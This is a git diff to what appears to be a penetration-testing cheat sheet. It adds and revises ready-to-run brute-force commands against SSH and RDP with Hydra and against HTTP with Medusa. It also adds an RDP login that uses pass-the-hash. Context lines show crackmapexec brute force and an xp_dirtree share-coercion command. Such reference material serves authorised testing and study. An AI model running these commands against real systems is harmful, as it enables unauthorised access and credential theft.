@@ -236,13 +236,14 @@ scp /path/to/source/file.ext username@{RHOST}:/path/to/destination
 scp -r /path/to/source/dir username@{RHOST}:/path/to/destination
 
 # Hydra brute force
-hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{IP ADDRESS}
+hydra -f -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{IP ADDRESS}
+hydra -f -t 16 -L {user.txt} -P {pass.txt} ssh://{RHOST}
 
 # Crackmap brute force
 crackmapexec ssh {IP ADDRESS} -u {USER.txt} -p {PASSWORD.txt}
 
 # sign_and_send_pubkey: no mutual signature supported
--o PubkeyAcceptedKeyTypes=+ssh-rsa
+-oPubkeyAcceptedKeyTypes=+ssh-rsa
 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1
 
 
@@ -649,6 +650,21 @@ sql> xp_dirtree "\\{IP ADDRESS}\test"
 
 
 <br />
+
+## RDP [3389] 
+
+<br />
+
+
+```bash
+# Remote Connect Password or Hash
+xfreerdp /u:{USER} /p:'{PASS}' /cert:ignore /v:{RHOST} /dynamic-resolution
+xfreerdp /u:{USER} /pth:'{HASH}' /cert:ignore /v:{RHOST} /dynamic-resolution
+
+# Brute Force RDP
+hydra -f -t 16 -L {user.txt} -P {pass.txt} rdp://{RHOST}
+
+```
 
 
 ## WINRM [5985, 5986] 
@@ -1651,7 +1667,7 @@ username=admin$password=FUZZ
 username=WFUZZ$password=HFUZZ
 
 # Medusa
-medusa -h {IP ADDRESS} -u {USER} -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/{DIR}
+medusa -f -h {IP ADDRESS} -u {USER} -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/{DIR}
 
 ```
 <br />
